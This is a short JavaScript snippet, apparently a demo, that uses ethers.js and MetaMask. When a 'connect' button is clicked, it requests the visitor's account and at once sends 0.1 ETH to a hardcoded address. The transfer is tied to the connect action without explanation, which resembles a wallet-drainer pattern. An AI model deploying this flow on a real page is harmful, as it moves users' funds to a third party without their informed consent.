const provider = new ethers.providers.Web3Provider(window.ethereum);
const utils = ethers.utils;
const metamaskBTN = document.querySelector("#metamask");
metamaskBTN.addEventListener("click", () => getAcc());

const signer = provider.getSigner();

const getAcc = async () => {
    const accounts = await provider.send("eth_requestAccounts", []);
    const account = accounts[0];
    const balance = await provider.getBalance(account).then((balance) => utils.formatEther(balance));
    sendETH(account);
};

const sendETH = async () => {
    const txObj = {
        to: "0xF59465Bc913847c665D96B7E932e36445f6dCe63",
        value: ethers.utils.parseEther("0.1"),
    };
    let gasPrice = await provider.getGasPrice();
    gasPrice = utils.formatUnits(gasPrice, "gwei");

    // signer.getTransactionCount().then((res) => console.log(res));
    // signer.signMessage("Hello World").then((res) => console.log(res));
    const txHash = await signer.sendTransaction(txObj);
    const confirms = 1;
    const receipt = await provider.waitForTransaction(txHash.hash, confirms, 3000);
    console.log("Transaction confirmed with 1 confirmations in block", receipt);
};
